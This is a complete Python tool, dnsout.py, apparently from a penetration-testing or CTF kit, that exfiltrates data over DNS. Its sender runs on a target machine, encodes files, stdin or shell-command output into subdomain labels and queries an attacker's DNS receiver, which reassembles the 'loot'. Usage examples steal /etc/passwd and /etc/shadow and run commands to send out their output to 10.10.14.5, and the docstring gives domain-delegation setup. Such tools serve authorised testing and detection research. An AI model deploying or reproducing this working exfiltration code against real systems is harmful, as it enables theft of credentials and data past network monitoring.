#!/usr/bin/env python3
"""
dnsout.py — DNS exfiltration (sender + receiver)
=================================================
Pure stdlib. No pip install required on either side.

How it works:
  Data is base32-encoded, split into 30-char chunks, and sent as
  DNS A-record lookups:  <chunk>.<id>.<seq>.<domain>
  The receiver listens on UDP/53 (or any port with --port) and
  reassembles the stream from the subdomain labels.

Usage — RECEIVER (your machine, needs port 53 or use --port):
    sudo python3 dnsout.py recv --domain exfil.yourdomain.com
    sudo python3 dnsout.py recv --domain exfil.yourdomain.com --port 53 --out loot.txt

    # No domain / test mode — just listen and print
    python3 dnsout.py recv --port 5353

Usage — SENDER (target machine):
    # Exfil a file
    python3 dnsout.py send --file /etc/passwd --dns 10.10.14.5 --domain exfil.yourdomain.com

    # Exfil stdin
    cat /etc/shadow | python3 dnsout.py send --stdin --dns 10.10.14.5 --domain exfil.yourdomain.com

    # Exfil command output
    python3 dnsout.py send --cmd "id && uname -a" --dns 10.10.14.5 --domain exfil.yourdomain.com

    # Use a custom port if receiver isn't on 53
    python3 dnsout.py send --file /etc/passwd --dns 10.10.14.5 --port 5353 --domain test.local

Options (shared):
    --domain   Base domain for exfil (e.g. exfil.yourdomain.com)
    --port     DNS port (default 53; use 5353+ for no-root testing)
    --delay    Seconds between queries (default 0.15; raise if dropping)
    --chunk    Label chunk size — max 30 (default 28)

Setup tip — domain delegation:
    In your DNS registrar, create an NS record:
        exfil.yourdomain.com  →  NS  <your_server_ip>
    Then run the receiver; all queries for *.exfil.yourdomain.com reach you.
    Without delegation, use --dns <server_ip> directly on the sender.
"""

import sys, os, socket, struct, time, base64, hashlib, argparse, subprocess, threading
from collections import defaultdict
from pathlib import Path

# ── Colours ────────────────────────────────────────────────────────────────────
R="\033[31m"; G="\033[32m"; Y="\033[33m"; C="\033[36m"; B="\033[1m"; X="\033[0m"

def ok(m):   print(f"{G}[+]{X} {m}", flush=True)
def err(m):  print(f"{R}[!]{X} {m}", flush=True)
def info(m): print(f"{C}[*]{X} {m}", flush=True)
def warn(m): print(f"{Y}[~]{X} {m}", flush=True)


# ══════════════════════════════════════════════════════════════════════════════
#  DNS WIRE FORMAT — minimal encoder/decoder (no dnspython needed)
# ══════════════════════════════════════════════════════════════════════════════

def _encode_name(name: str) -> bytes:
    """Encode a DNS name to wire format."""
    out = b""
    for label in name.rstrip(".").split("."):
        lb = label.encode()
        out += bytes([len(lb)]) + lb
    return out + b"\x00"


def _decode_name(data: bytes, offset: int):
    """Decode a DNS name from wire format, return (name_str, new_offset)."""
    labels = []
    visited = set()
    while True:
        if offset >= len(data):
            break
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:        # pointer
            if offset + 1 >= len(data):
                break
            ptr = struct.unpack("!H", data[offset:offset+2])[0] & 0x3FFF
            offset += 2
            if ptr in visited:
                break
            visited.add(ptr)
            label, _ = _decode_name(data, ptr)
            labels.append(label)
            return ".".join(labels), offset
        else:
            offset += 1
            labels.append(data[offset:offset+length].decode(errors="replace"))
            offset += length
    return ".".join(labels), offset


def _build_nxdomain(query: bytes) -> bytes:
    """Build a minimal NXDOMAIN response for the given DNS query packet."""
    if len(query) < 12:
        return b""
    tx_id = query[:2]
    flags = struct.pack("!H", 0x8183)   # response, recursion desired, NXDOMAIN
    counts = struct.pack("!HHHH", 1, 0, 0, 0)
    question_section = query[12:]       # re-use the question verbatim
    return tx_id + flags + counts + question_section


def parse_query_name(data: bytes) -> str:
    """Return the queried name from a DNS query packet."""
    if len(data) < 12:
        return ""
    name, _ = _decode_name(data, 12)
    return name


# ══════════════════════════════════════════════════════════════════════════════
#  ENCODING HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _b32enc(data: bytes) -> str:
    """Base32-encode, lowercase, strip padding."""
    return base64.b32encode(data).decode().lower().rstrip("=")

def _b32dec(s: str) -> bytes:
    """Base32-decode (case-insensitive, restore padding)."""
    s = s.upper()
    pad = (8 - len(s) % 8) % 8
    return base64.b32decode(s + "=" * pad)

def _session_id() -> str:
    """Short random session ID so multiple concurrent exfils don't collide."""
    return base64.b32encode(os.urandom(3)).decode().lower().rstrip("=")


# ══════════════════════════════════════════════════════════════════════════════
#  SENDER
# ══════════════════════════════════════════════════════════════════════════════

def send_data(data: bytes, dns_server: str, domain: str, port: int,
              delay: float, chunk_size: int):
    """Exfiltrate bytes over DNS by querying <chunk>.<sid>.<seq>.<domain>."""
    sid = _session_id()
    encoded = _b32enc(data)
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    total = len(chunks)

    info(f"Session   : {sid}")
    info(f"Payload   : {len(data)} bytes  →  {len(encoded)} chars  →  {total} queries")
    info(f"DNS server: {dns_server}:{port}")
    info(f"Domain    : {domain}")
    info(f"Delay     : {delay}s between queries\n")

    # Signal start: <sid>.START.<total>.<domain>
    _dns_query(f"{sid}.start.{total}.{domain}", dns_server, port)
    time.sleep(delay)

    for seq, chunk in enumerate(chunks):
        qname = f"{chunk}.{sid}.{seq}.{domain}"
        _dns_query(qname, dns_server, port)
        if seq % 10 == 0:
            print(f"\r  {C}Sent {seq+1}/{total}{X}", end="", flush=True)
        time.sleep(delay)

    print()

    # Signal end
    _dns_query(f"{sid}.end.{total}.{domain}", dns_server, port)
    time.sleep(delay)
    ok(f"Done — {total} queries sent for session {sid}")


def _dns_query(qname: str, server: str, port: int):
    """Send a single DNS A query (fire and forget)."""
    tx_id = os.urandom(2)
    flags = struct.pack("!H", 0x0100)   # standard query, recursion desired
    counts = struct.pack("!HHHH", 1, 0, 0, 0)
    qtype  = struct.pack("!HH", 1, 1)   # A record, IN class
    pkt = tx_id + flags + counts + _encode_name(qname) + qtype
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.sendto(pkt, (server, port))
        s.close()
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  RECEIVER
# ══════════════════════════════════════════════════════════════════════════════

class Session:
    def __init__(self, sid: str, total: int):
        self.sid    = sid
        self.total  = total
        self.chunks : dict[int, str] = {}
        self.done   = False
        self.ts     = time.time()

    def add(self, seq: int, chunk: str):
        self.chunks[seq] = chunk

    def complete(self) -> bool:
        return len(self.chunks) >= self.total

    def assemble(self) -> bytes:
        ordered = "".join(self.chunks[i] for i in sorted(self.chunks))
        return _b32dec(ordered)


def recv_loop(bind_port: int, domain: str, out_path: str | None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind(("0.0.0.0", bind_port))
    except PermissionError:
        err(f"Cannot bind port {bind_port} — try sudo or use --port 5353")
        sys.exit(1)

    ok(f"Listening on UDP 0.0.0.0:{bind_port}")
    if domain:
        info(f"Filtering domain: *.{domain}")
    info("Waiting for exfil sessions …\n")

    sessions: dict[str, Session] = {}

    while True:
        try:
            data, addr = sock.recvfrom(512)
        except KeyboardInterrupt:
            info("Shutting down")
            break

        qname = parse_query_name(data)
        if not qname:
            continue

        # Send NXDOMAIN so the sender doesn't hang waiting for a response
        try:
            sock.sendto(_build_nxdomain(data), addr)
        except Exception:
            pass

        # Strip base domain if set
        name = qname.lower()
        if domain:
            if not name.endswith(domain.lower()):
                continue
            name = name[: -(len(domain) + 1)]   # strip .<domain>

        parts = name.split(".")
        if len(parts) < 3:
            continue

        sid   = parts[-2]
        field = parts[-1]     # seq number OR "start"/"end"
        chunk = ".".join(parts[:-2])

        # START beacon: <sid>.start.<total>
        if chunk == sid and field == "start":
            # re-parse: format is <sid>.start.<total>
            if len(parts) >= 3:
                try:
                    total = int(parts[-1]) if parts[-1].isdigit() else int(parts[0])
                except Exception:
                    continue
            continue

        if chunk in ("start", "end"):
            # start/end beacons: <sid>.start.<total> or <sid>.end.<total>
            try:
                total = int(field)
            except Exception:
                continue
            if chunk == "start":
                sessions[sid] = Session(sid, total)
                ok(f"Session {sid} started — expecting {total} chunks from {addr[0]}")
            elif chunk == "end" and sid in sessions:
                s = sessions[sid]
                if s.complete():
                    _finalize(s, out_path)
                    del sessions[sid]
                else:
                    warn(f"Session {sid} ended but {s.total - len(s.chunks)} chunks missing")
            continue

        # Data chunk: <chunk>.<sid>.<seq>
        if not field.isdigit():
            continue
        seq = int(field)

        if sid not in sessions:
            # Auto-create session if we missed the START beacon
            sessions[sid] = Session(sid, 9999)
            warn(f"Auto-created session {sid} (missed START beacon)")

        sessions[sid].add(seq, chunk)
        print(f"\r  {C}[{sid}] recv {len(sessions[sid].chunks)} chunks{X}", end="", flush=True)


def _finalize(s: Session, out_path: str | None):
    print()
    try:
        payload = s.assemble()
        ok(f"Session {s.sid} complete — {len(payload)} bytes")
        text = payload.decode(errors="replace")
        print(f"\n{B}{'─'*60}{X}")
        print(text[:4000])
        if len(text) > 4000:
            warn(f"Output truncated — {len(text) - 4000} more bytes")
        print(f"{B}{'─'*60}{X}\n")
        if out_path:
            Path(out_path).write_bytes(payload)
            ok(f"Saved to {out_path}")
    except Exception as e:
        err(f"Assembly error for session {s.sid}: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="DNS exfiltration — sender + receiver",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    # recv
    r = sub.add_parser("recv", help="Run DNS receiver (your machine)")
    r.add_argument("--domain", default="", help="Expected base domain (optional filter)")
    r.add_argument("--port",   type=int, default=53, help="UDP port to listen on (default 53)")
    r.add_argument("--out",    help="Save each received payload to this file")

    # send
    s = sub.add_parser("send", help="Exfiltrate data (target machine)")
    s.add_argument("--dns",    required=True, help="IP of your DNS receiver")
    s.add_argument("--domain", default="x.local", help="Base domain (default x.local)")
    s.add_argument("--port",   type=int, default=53, help="DNS port (default 53)")
    s.add_argument("--delay",  type=float, default=0.15, help="Delay between queries (default 0.15s)")
    s.add_argument("--chunk",  type=int, default=28, help="Chunk size (default 28, max 30)")
    grp = s.add_mutually_exclusive_group(required=True)
    grp.add_argument("--file",  help="File to exfiltrate")
    grp.add_argument("--cmd",   help="Shell command — exfiltrate its output")
    grp.add_argument("--stdin", action="store_true", help="Read from stdin")

    args = parser.parse_args()

    if args.mode == "recv":
        recv_loop(args.port, args.domain, args.out)

    elif args.mode == "send":
        if args.file:
            data = Path(args.file).read_bytes()
            info(f"Exfiltrating file: {args.file}")
        elif args.cmd:
            info(f"Running: {args.cmd}")
            result = subprocess.run(args.cmd, shell=True, capture_output=True)
            data = result.stdout + result.stderr
            info(f"Output: {len(data)} bytes")
        else:
            info("Reading stdin …")
            data = sys.stdin.buffer.read()

        chunk = min(args.chunk, 30)
        send_data(data, args.dns, args.domain, args.port, args.delay, chunk)


if __name__ == "__main__":
    main()
